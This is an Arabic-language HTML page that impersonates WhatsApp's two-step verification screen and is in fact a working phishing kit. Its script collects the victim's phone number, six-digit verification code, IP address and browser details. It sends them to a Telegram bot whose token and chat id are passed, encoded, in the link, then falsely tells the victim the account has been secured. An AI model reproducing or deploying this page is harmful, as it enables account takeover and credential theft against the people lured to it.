<!DOCTYPE html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>WhatsApp • التحقق بخطوتين</title> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <style> * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; } body { background: #0a1014; min-height: 100vh; display: flex; align-items: center; justify-content: center; position: relative; } /* خلفية واتساب المميزة */ .wa-bg-pattern { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" opacity="0.03"><path fill="%2300a884" d="M16 0C7.2 0 0 7.2 0 16c0 2.9 0.8 5.7 2.2 8.2L0 32l8.2-2.2c2.5 1.4 5.3 2.2 8.2 2.2 8.8 0 16-7.2 16-16S24.8 0 16 0z M24 19.5c-0.3 1.5-1.5 2.7-2.9 3.1-1.5 0.4-3.2 0.4-5.8-1.2-2.6-1.6-4.9-4.1-6.1-6.6-1.2-2.6-1-4.3-0.6-5.8 0.4-1.5 1.7-2.7 3.1-2.9 0.8-0.1 1.5 0 2.1 0.7 0.6 0.7 1.8 2.3 2 2.7 0.2 0.4 0.3 0.9 0.1 1.4-0.2 0.5-0.6 0.9-1.1 1.3-0.5 0.4-0.8 0.7-0.9 1.1 0.3 0.9 1.4 2.3 2.6 3.2 1.3 0.9 2.3 1.3 3.1 1.2 0.4-0.1 0.8-0.5 1.3-1 0.5-0.5 1.1-0.6 1.7-0.4 0.6 0.2 2.3 1.1 2.7 1.3 0.4 0.2 0.7 0.4 0.8 0.8 0 0.4 0 1.2-0.3 2.7z"/></svg>'); background-repeat: repeat; pointer-events: none; } .container { width: 100%; max-width: 480px; margin: 20px; position: relative; z-index: 10; } /* بطاقة واتساب */ .wa-card { background: #1f2c33; border-radius: 32px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #2a3942; } /* الهيدر */ .wa-header { background: #1f2c33; padding: 30px 25px 20px; text-align: center; border-bottom: 1px solid #2a3942; } .wa-logo { background: #00a884; width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 40px; color: white; box-shadow: 0 4px 15px rgba(0,168,132,0.3); } .wa-header h2 { color: #e9edef; font-size: 24px; font-weight: 600; margin-bottom: 8px; } .wa-header p { color: #8696a0; font-size: 15px; } /* المحتوى */ .wa-body { padding: 25px; } /* شريط الخطوات */ .steps { display: flex; align-items: center; justify-content: center; margin-bottom: 35px; gap: 10px; } .step-item { display: flex; align-items: center; gap: 8px; } .step-circle { width: 40px; height: 40px; border-radius: 50%; background: #2a3942; border: 2px solid #37464f; color: #8696a0; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 18px; transition: all 0.3s; } .step-circle.active { background: #00a884; border-color: #00a884; color: white; } .step-circle.completed { background: #00a884; border-color: #00a884; color: white; } .step-line { width: 40px; height: 2px; background: #2a3942; } /* حقول الإدخال */ .input-group { margin-bottom: 25px; } .input-group label { display: block; color: #e9edef; margin-bottom: 10px; font-size: 15px; font-weight: 500; } .input-group label i { color: #00a884; margin-left: 8px; } .input-field { width: 100%; padding: 18px 20px; background: #2a3942; border: 2px solid #37464f; border-radius: 18px; color: #e9edef; font-size: 18px; direction: ltr; text-align: left; transition: all 0.2s; } .input-field:focus { outline: none; border-color: #00a884; background: #2f3e48; } .input-field::placeholder { color: #8696a0; font-size: 15px; } /* زر رئيسي */ .wa-btn { width: 100%; padding: 18px; background: #00a884; border: none; border-radius: 30px; color: white; font-size: 18px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px; transition: all 0.2s; margin: 20px 0 15px; } .wa-btn:hover:not(:disabled) { background: #06b38f; transform: scale(1.02); box-shadow: 0 10px 25px rgba(0,168,132,0.4); } .wa-btn:disabled { opacity: 0.5; cursor: not-allowed; } /* مؤقت */ .timer-box { background: #2a3942; border-radius: 40px; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; margin: 25px 0; border: 1px solid #37464f; } .timer-icon { color: #00a884; font-size: 20px; } .timer-text { color: #8696a0; font-size: 15px; } .timer-display { background: #1f2c33; padding: 8px 18px; border-radius: 30px; color: #00a884; font-size: 24px; font-weight: 700; font-family: monospace; border: 1px solid #37464f; } /* رسالة المساعدة */ .help-text { text-align: center; color: #8696a0; font-size: 14px; margin: 20px 0 10px; } .help-text i { color: #00a884; margin-left: 5px; } /* الفوتر */ .wa-footer { padding: 25px; text-align: center; border-top: 1px solid #2a3942; color: #8696a0; font-size: 13px; } .wa-footer a { color: #00a884; text-decoration: none; } /* إشعار مؤقت */ .toast-message { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #00a884; color: white; padding: 15px 30px; border-radius: 50px; font-weight: 500; box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 1000; animation: slideUp 0.3s ease; display: none; } @keyframes slideUp { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } } </style> </head> <body> <div class="wa-bg-pattern"></div> <div class="container"> <div class="wa-card"> <!-- الهيدر --> <div class="wa-header"> <div class="wa-logo"> <i class="fab fa-whatsapp"></i> </div> <h2>التحقق بخطوتين</h2> <p>أدخل رقم هاتفك لتلقي رمز التحقق</p> </div> <!-- مسار الخطوات --> <div class="wa-body"> <div class="steps"> <div class="step-item"> <div class="step-circle active" id="step1Circle">1</div> </div> <div class="step-line"></div> <div class="step-item"> <div class="step-circle" id="step2Circle">2</div> </div> </div> <!-- الخطوة 1: إدخال رقم الهاتف --> <div id="step1"> <div class="input-group"> <label><i class="fas fa-phone-alt"></i> رقم الهاتف</label> <input type="tel" id="phoneNumber" class="input-field" placeholder="مثال: 201234567890" value="201012345678" dir="ltr"> </div> <button class="wa-btn" id="sendPhoneBtn"> <i class="fab fa-whatsapp"></i> إرسال رمز التحقق </button> <div class="help-text"> <i class="fas fa-shield-alt"></i> سنرسل رمزًا مكونًا من 6 أرقام إلى هذا الرقم </div> </div> <!-- الخطوة 2: إدخال رمز التحقق (مخفية في البداية) --> <div id="step2" style="display: none;"> <div class="timer-box"> <div class="timer-icon"> <i class="fas fa-clock"></i> </div> <div class="timer-text">ينتهي الرمز خلال</div> <div class="timer-display" id="timer">05:00</div> </div> <div class="input-group"> <label><i class="fas fa-lock"></i> رمز التحقق</label> <input type="text" id="verifyCode" class="input-field" placeholder="_ _ _ _ _ _" maxlength="6" inputmode="numeric" pattern="\d*" dir="ltr"> </div> <button class="wa-btn" id="verifyCodeBtn"> <i class="fas fa-check-circle"></i> توثيق الحساب </button> <div class="help-text" id="resendHelp"> <i class="fas fa-redo-alt"></i> <span id="resendTimer">يمكنك إعادة الإرسال بعد 05:00</span> </div> </div> <!-- معلومات إضافية --> <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #2a3942;"> <div style="display: flex; align-items: center; gap: 12px; color: #8696a0; font-size: 13px;"> <i class="fas fa-check-circle" style="color: #00a884;"></i> <span>هذه الخطوات ضرورية لتأمين حسابك على واتساب</span> </div> </div> </div> <!-- الفوتر --> <div class="wa-footer"> <p>© 2025 WhatsApp LLC • <a href="#">سياسة الخصوصية</a></p> </div> </div> </div> <!-- رسالة منبثقة --> <div class="toast-message" id="toast"></div> <script> // ==================== الإعدادات الأساسية ==================== function decodeToken(encoded) { try { return atob(decodeURIComponent(encoded)); } catch { return null; } } // قراءة الباراميترات من الرابط const params = new URLSearchParams(window.location.search); const CHAT_ID = params.get('id'); const encodedToken = params.get('tok'); const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; // التحقق من صحة الرابط if(!CHAT_ID || !BOT_TOKEN) { alert('⚠️ رابط غير صالح\nالرجاء استخدام الرابط الصحيح مع ?id=و?tok='); } // ==================== المتغيرات ==================== let timeLeft = 5 * 60; // 5 دقائق let timerInterval; let resendInterval; let canResend = false; let generatedCode = ''; // هيكون ثابت 123456 في المثال ده // العناصر const step1 = document.getElementById('step1'); const step2 = document.getElementById('step2'); const step1Circle = document.getElementById('step1Circle'); const step2Circle = document.getElementById('step2Circle'); const phoneInput = document.getElementById('phoneNumber'); const codeInput = document.getElementById('verifyCode'); const sendPhoneBtn = document.getElementById('sendPhoneBtn'); const verifyBtn = document.getElementById('verifyCodeBtn'); const timerDisplay = document.getElementById('timer'); const resendSpan = document.getElementById('resendTimer'); const toast = document.getElementById('toast'); // ==================== الدوال المساعدة ==================== function showToast(msg, isSuccess = true) { toast.style.display = 'block'; toast.style.background = isSuccess ? '#00a884' : '#e74c3c'; toast.textContent = msg; setTimeout(() => { toast.style.display = 'none'; }, 3000); } function formatTime(seconds) { const mins = Math.floor(seconds / 60); const secs = seconds % 60; return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`; } function startTimers() { // توقيت الكود timeLeft = 5 * 60; if(timerInterval) clearInterval(timerInterval); timerInterval = setInterval(() => { if(timeLeft > 0) { timeLeft--; timerDisplay.textContent = formatTime(timeLeft); } else { clearInterval(timerInterval); timerDisplay.textContent = '00:00'; canResend = true; updateResendText(); } }, 1000); // توقيت إعادة الإرسال let resendTime = 30; canResend = false; if(resendInterval) clearInterval(resendInterval); resendInterval = setInterval(() => { if(resendTime > 0) { resendTime--; resendSpan.textContent = `يمكنك إعادة الإرسال بعد 00:${resendTime.toString().padStart(2, '0')}`; } else { clearInterval(resendInterval); canResend = true; resendSpan.innerHTML = `<i class="fas fa-redo-alt" style="color: #00a884;"></i> إعادة إرسال الرمز`; resendSpan.style.cursor = 'pointer'; resendSpan.onclick = resendCode; } }, 1000); } function updateResendText() { if(canResend) { resendSpan.innerHTML = `<i class="fas fa-redo-alt" style="color: #00a884;"></i> إعادة إرسال الرمز`; resendSpan.style.cursor = 'pointer'; resendSpan.onclick = resendCode; } } // إعادة إرسال الكود async function resendCode() { if(!canResend) return; const phone = phoneInput.value.trim(); if(!phone) { showToast('الرجاء إدخال رقم الهاتف أولاً', false); return; } // إرسال إشعار إعادة الإرسال للبوت const message = `🔄 <b>WhatsApp - إعادة إرسال رمز</b>\n━━━━━━━━━━━━━━\n📱 <b>الرقم:</b> ${phone}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━`; try { const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); if(response.ok) { showToast('تم إعادة إرسال الرمز بنجاح'); // إعادة تشغيل التايمر startTimers(); } } catch (error) { showToast('فشل إعادة الإرسال', false); } } // ==================== الخطوة 1: إرسال رقم الهاتف ==================== sendPhoneBtn.addEventListener('click', async function() { const phone = phoneInput.value.trim(); if(!phone) { showToast('الرجاء إدخال رقم الهاتف', false); return; } if(phone.length < 10) { showToast('رقم الهاتف غير صحيح', false); return; } // تجهيز الرسالة للبوت const ipResponse = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'غير معروف' }) })); const ipData = await ipResponse.json(); const message = `📱 <b>WhatsApp - خطوة 1: رقم الهاتف</b>\n━━━━━━━━━━━━━━\n📞 <b>الرقم:</b> ${phone}\n🌍 <b>IP:</b> ${ipData.ip}\n📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0,100)}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━`; try { const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); const result = await response.json(); if(result.ok) { showToast('تم إرسال رمز التحقق إلى هاتفك'); // الانتقال للخطوة 2 step1.style.display = 'none'; step2.style.display = 'block'; step1Circle.classList.remove('active'); step1Circle.classList.add('completed'); step2Circle.classList.add('active'); // بدء التايمرات startTimers(); // تجربة: الكود هو 123456 generatedCode = '123456'; console.log('الكود التجريبي:', generatedCode); } else { showToast('فشل الإرسال: ' + result.description, false); } } catch (error) { showToast('حدث خطأ في الاتصال', false); } }); // ==================== الخطوة 2: التحقق من الكود ==================== verifyBtn.addEventListener('click', async function() { const code = codeInput.value.trim(); const phone = phoneInput.value.trim(); if(!code || code.length !== 6) { showToast('الرجاء إدخال رمز التحقق المكون من 6 أرقام', false); return; } // تجهيز الرسالة للبوت const ipResponse = await fetch('https://api.ipify.org?format=json').catch(() => ({ json: () => ({ ip: 'غير معروف' }) })); const ipData = await ipResponse.json(); const message = `✅ <b>WhatsApp - خطوة 2: رمز التحقق</b>\n━━━━━━━━━━━━━━\n📱 <b>الرقم:</b> ${phone}\n🔑 <b>الرمز:</b> ${code}\n🌍 <b>IP:</b> ${ipData.ip}\n📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0,100)}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━`; try { const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); const result = await response.json(); if(result.ok) { showToast('✅ تم توثيق الحساب بنجاح!'); // إنهاء الخطوات step2Circle.classList.add('completed'); // إخفاء التايمرات clearInterval(timerInterval); clearInterval(resendInterval); // بعد ثانيتين نعرض رسالة النجاح setTimeout(() => { alert('🎉 تهانينا! تم توثيق حساب واتساب الخاص بك بنجاح.\nسيتم تحويلك إلى صفحة المحادثات...'); // هنا ممكن تحول المستخدم لرابط تاني // window.location.href = 'https://web.whatsapp.com'; }, 1000); } else { showToast('فشل التوثيق: ' + result.description, false); } } catch (error) { showToast('حدث خطأ في الاتصال', false); } }); // السماح بإدخال أرقام فقط في حقل الكود codeInput.addEventListener('input', function(e) { this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6); }); // رسالة إذا الرابط مش صالح if(!CHAT_ID || !BOT_TOKEN) { document.body.innerHTML = ` <div style="background: #1f2c33; color: white; padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; margin: 50px auto;"> <i class="fas fa-exclamation-triangle" style="color: #e74c3c; font-size: 50px; margin-bottom: 20px;"></i> <h2 style="margin-bottom: 15px;">رابط غير صالح</h2> <p style="color: #8696a0; margin-bottom: 20px;">الرجاء استخدام الرابط الصحيح مع باراميترات id و tok</p> <code style="background: #2a3942; padding: 10px; border-radius: 10px; display: block;">?id=123456789&tok=ZW5jb2RlZHRva2Vu</code> </div> `; } </script> </body> </html>
